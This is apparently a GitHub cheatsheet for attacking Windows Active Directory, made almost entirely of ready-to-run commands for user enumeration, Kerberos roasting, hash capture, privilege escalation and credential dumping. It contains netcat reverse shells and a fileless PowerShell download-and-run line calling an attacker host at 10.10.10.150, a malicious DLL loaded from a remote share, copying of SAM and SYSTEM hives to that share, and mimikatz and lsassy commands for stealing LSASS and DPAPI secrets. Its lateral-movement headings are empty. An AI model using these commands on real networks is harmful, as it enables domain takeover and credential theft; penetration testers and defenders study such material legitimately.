# winddows-Active-Directory-Cheatsheet

A cheatsheet in order to help during intrusion steps on Windows environment.

## Summary

- [Tools](#tools)
- [Enumeration](#enumeration)
  - [Pre auth](#pre-auth)
    - [Find valid users](#find-valid-users)
    - [Find valid credentials](#find-valid-credentials)
      - [AS REP Roast](#as-rep-roast)
      - [Responder](#responder)
  - [Post auth](#post-auth)
    - [Domain info](#domain-info)
      - [Powerview](#powerview)
      - [Bloodhound](#bloodhound)
      - [Ldeep](#ldeep)
    - [SPNs](#spns)
  - [Privelege Escalation](#privilege-escalation)
    - [PowerUp](#powerup)
    - [WinPeas](#winpeas)
    - [FullPower](#fullpowers)
    - [PrintSpoofer](#printspoofer)
    - [Potatoes](#potatoes)
    - [DNS Admin Abuse](#dns-admin-abuse)
    - [Backup Operator Abuse](#backup-operator-abuse)
    - [Exchange Abuse](#exchange-abuse)
  - [Credential Harversting](#credential-harvesting)
    - [LSASS](#lsass)
      - [mimikatz](#mimikatz)
      - [lsassy](#lsassy)
      - [procdump](#procdump)
    - [SAM](#sam)
      - [Impacket](#impacket)
    - [DPAPI](#dpapi)
      - [mimikatz](#mimikatz-1)
  - [Lateral Movement](#lateral-movement)
    - [CrackMapExec](#crackmapexec)
    - [Delegation](#delegation)
      - [Unconstrained Delegation](#unconstrained-delegation)
      - [Constrained Delegation](#constrained-delegation)
    - [Powershell Remoting](#powershell-remoting)
    - [RCE with PS Credentials](#rce-with-ps-credentials)
      
## Tools
- Kerbrute
  - [Tarlogic](https://github.com/TarlogicSecurity/kerbrute)
  - [ropnop](https://github.com/ropnop/kerbrute)
- [Responder](https://github.com/lgandx/Responder)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Weirdhta](https://github.com/felamos/weirdhta)
- [Powercat](https://github.com/besimorhino/powercat)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Lsassy](https://github.com/Hackndo/lsassy)
- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [Bloodhound](https://github.com/BloodHoundAD/BloodHound)
- [Ldeep](https://github.com/franc-pentest/ldeep)
- [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
- [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [FullPower](https://github.com/itm4n/FullPowers)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- Potatoes
  - [Rotten Potato](https://github.com/breenmachine/RottenPotatoNG)
  - [Juicy Potato](https://github.com/ohpe/juicy-potato)
  - [Rogue Potato](https://github.com/antonioCoco/RoguePotato)
- Enum4linux
  - [Old](https://github.com/tiyeuse/Active-Directory-Cheatsheet/tree/master/tools/enum4linux)
  - [Python version](https://github.com/0v3rride/Enum4LinuxPy)

## Enumeration

### Pre auth

#### Find valid users

With Kerbrute:

`kerbrute userenum --dc 10.10.10.10 -d <domain_name> users.txt -v`

With Enum4linux:

`./enum4linux.pl -v 10.10.10.10`

#### Find valid credentials

##### AS REP Roast
This attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

With Impacket:
It is important to specify -no-pass in the script, otherwise a badpwdcount entry will be added to the user.
```
# For multiples users
GetNPUsers.py -request <domain_name>/

# For a single user
GetNPUsers.py -request -dc-ip 10.10.10.10 -no-pass <domain_name>/<user>

# For multiples users
GetNPUsers.py -request -dc-ip 10.10.10.10 -no-pass -usersfile users.txt <domain_name>/
```
With Rubeus:
```
# For multiples users
Rubeus.exe asreproast /domain:<domain_name> /format:<hashcat|john> /outfile:<filename>

# For a single user
Rubeus.exe asreproast /user:<user> /domain:<domain_name> /format:<hashcat|john> /outfile:<filename>

# For a spesific Organization Unit (OU)
Rubeus.exe asreproast /ou:<OU_name> /domain:<domain_name> /format:<hashcat|john> /outfile:<filename>
```

##### Responder
In an internal network you can abuse old protocol (like NBT-NS or LLMNR) and grab NetNTLMv2 hashes. You can then try to crack them with john or hashcat.
```
# As root
./Responder.py -I eth0 -wrb
```
### Post Auth

#### Domain Info

##### Powerview
Get Current Domain:
```
Get-NetDomain
```
Enum Other Domains:
```
Get-NetDomain -Domain <domain_name>
```
Get Domain SID:
```
Get-DomainSID
```
Get Domain Policy:
```
Get-DomainPolicy
```
Get Domain Controlers:
```
Get-NetDomainController
Get-NetDomainController -Domain <domain_name>
```
Enumerate Domain Users:
```
Get-NetUser
Get-NetUser -SamAccountName <user> 
Get-NetUser | select cn

# Enumerate user logged on a machine
Get-NetLoggedon
Get-NetLoggedon -ComputerName <computer_name>

# Enumerate Session Information for a machine
Get-NetSession
```
Enum Domain Computers:
```
Get-NetComputer -FullData
Get-DomainGroup

# Enumerate Live machines 
Get-NetComputer -Ping
```
Enumerate Shares:
```
# Enumerate Domain Shares
Find-DomainShare

# Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess
```
Enum Group Policies:
```
Get-NetGPO

# Shows active Policy on specified machine
Get-NetGPO -ComputerName <computer_name>
Get-NetGPOGroup

# Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName <computer_name>
```
Enum ACLs:
```
# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"
```
Enum Domain Trust:
```
Get-NetDomainTrust
Get-NetDomainTrust -Domain <domain_name>
```
Enum Forest Trust:
```
Get-NetForestDomain
Get-NetForestDomain Forest <forest_name>

# Domains of Forest Enumeration
Get-NetForestDomain
Get-NetForestDomain Forest <forest_name>

# Map the Trust of the Forest
Get-NetForestTrust
Get-NetDomainTrust -Forest <forest_name>
```
User Hunting:
```
# Find all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

# Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose

# Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth

# Confirming admin access:
Invoke-UserHunter -CheckAccess
```
:heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
I have local admin access on a machine -> A Domain Admin has a session on that machine 
  -> I steal his credentials/token and impersonate him

  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

##### Bloodhound

With Powershell:
```
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup,LoggedOn
Invoke-BloodHound -IgnoreLdapCert -LdapUser <user> -LdapPass <password> -CollectionMethod All,GPOLocalGroup,LoggedOn
```
With Exe:
```
.\sh.exe --CollectionMethod All,GPOLocalGroup
```

##### Ldeep
```
# Get users
ldeep -s 10.10.10.10 -d <DOMAIN_FQDN> -u <user> -p <password> users

# Dump all LDAP, generating also .lst files
ldeep -s 10.10.10.10 -d <DOMAIN_FQDN> -u <user> -p <password> all ldap_dump/
```

#### SPNs

With Impacket:
```
GetUserSPNs.py <domain_name>/<user>:<password>
GetUserSPNs.py <domain_name>/<user> -outputfile <filename> -hashes :<nt_hash>
```

With Powerview:
```
# List users with SPN
Get-NetUser -SPN

# Request TGS for every SPN
Invoke-Kerberoast
```
With Rubeus:
```
# Kerberoasting and outputing on a file with a specific format
Rubeus.exe kerberoast /domain:<domain_name> /outfile:<filename> 

# Kerberoast specific user account
Rubeus.exe kerberoast /user:<user> /domain:<domain_name> /outfile:<filename> /simple

# Kerberoast by specifying credentials 
Rubeus.exe kerberoast /creduser:<user> /credpassword:<password> /domain:<domain_name> /outfile:<filename>
```

### Privilege Escalation

#### PowerUp

```
Invoke-AllChecks
```

#### WinPeas
```
.\winpeas.exe cmd
```

#### FullPowers
Abuse some services executed as `LOCAL SERVICE` or `NETWORK SERVICE` in order to obtain `SeAssignPrimaryToken` and `SeImpersonatePrivilege` tokens.
```
.\fullpw.exe -c ".\nc.exe 10.10.10.150 443 -e powershell" -z
```
#### PrintSpoofer
Escalate to SYSTEM.
The token `SeImpersonatePrivilege` is needed to escalate privileges.
```
.\pspoof.exe -c "C:\windows\temp\custom\nc.exe 10.10.10.150 443 -e powershell"
```

#### Potatoes
Like PrintSpoofer, the token `SeImpersonatePrivilege` is abused to escalate privileges.
```
# Using a CLSID, C:\tmp\root.bat contains a reverse shell
.\juicy.exe -t * -p C:\tmp\root.bat -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -l 9002

# Fileless reverse shell
.\juicy.exe -l 12345 -p C:\Window\System32\cmd.exe -t * -a "/c powershell.exe -nop -w hidden -executionpolicy bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.150/nishang.ps1')"
```
CLSID can be obtain [here](http://ohpe.it/juicy-potato/CLSID/).

#### DNS Admin Abuse
If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.

```
# Get members of the DNSAdmins group
net localgroup "DNSAdmins" /domain
# Load a malicious dll from a member of DNSAdmins context
# Stop service
sc.exe \\<DNS_SERVER> stop dns
# Replace the dll
dnscmd.exe /config /serverlevelplugindll \\10.10.10.150\share\evil.dll
# Restart the service
sc.exe \\<DNS_SERVER> start dns
```

#### Backup Operator Abuse
If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's `SeBackupPrivilege` to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.

1) Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:
```
# Create a .txt file that will contain the shadow copy process script
Script ->{
set metadata c:\<PathToSave>metadata.cab
set context clientaccessible
set context persistent
begin backup
add volume c: alias mydrive
create
expose %mydrive% w:
}
```
2) Next we need to access the shadow copy, we may have the `SeBackupPrivilege` but we cant just 
simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we can use [this](https://github.com/giuliano108/SeBackupPrivilege) repo:
```
# Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
  
# Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege
  
# If it isn't we enable it
Set-SeBackupPrivilege
  
# Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
  
# Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive 
```
3) Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
4) Use secretsdump.py from impacket and dump the hashes.
5) Use psexec or another tool of your choice to PTH and get Domain Admin access.

#### Exchange Abuse
- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Credential Harvesting

#### LSASS

##### Mimikatz
```
# On the machine (AV might block it)
.\mimikatz.exe "sekurlsa::logonPasswords full" exit

# Locally from a minidump
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
```
##### Lsassy
```
lsassy -d <domain_name> -u <user> -p <password> -r -vv 10.10.10.10
lsassy -d <domain_name> -u <user> -p <password> -dc-ip 10.10.10.10 -r --procdump /path/to/procdump -vv 10.10.10.0/24
```
##### Procdump
```
.\procdump64.exe -accepteula -ma lsass.exe lsass
.\procdump64.exe -accepteula -ma <lsass_pid> lsass
```

#### SAM

##### Impacket
```
secretsdump.py <domain_name>/<user>:<password>@10.10.10.10
secretsdump.py <domain_name>/<user>@10.10.10.10 -hashes :<nt_hash>

# Locally
# Dump SYSTEM, SAM hives
reg save HKLM\SYSTEM \\10.10.10.150\share\SYSTEM
reg save HKLM\SYSTEM  \\10.10.10.150\share\SAM
secretsdump.py -sam SAM -system SYSTEM local
```

#### DPAPI

##### Mimikatz
From [mimikatz github](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
```
# Check the details of the credential
.\mimikatz.exe "dpapi::cred /in:C:\Users\victim\AppData\Local\Microsoft\Credentials\12345678901234567890123456789012" exit

# Get victim security context (inject into user process or impersonnate with token)
# Decrypt the Masterkey using her password: Tip: if we are on a user's context using /rpc will auth with DC and will decrypt the masterkey!
.\mimikatz.exe "dpapi::masterkey /in:c:\Users\victim\AppData\Roaming\Microsoft\Protect\S-1-5-21-1313131313-8888888888-9999999999-1111\5f4b97cd-43aa-5e0f-26ab-fe63d801bbc4 /rpc" exit

Results: Masterkey:abcdef0123[...]4567890
SHA1 of masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f

# Decrypt the credential
.\mimikatz.exe "token::elevate dpapi::cred /in:C:\Users\victim\AppData\Local\Microsoft\Credentials\12345678901234567890123456789012 /masterkey:6b82b138e1a6b77f4c55a8df728288f56a3b6d5f" exit
```
### Lateral Movement

#### CrackMapExec

#### Delegation

##### Unconstrained Delegation

##### Constrained Delegation

#### Powershell Remoting

#### Rce with PS credentials
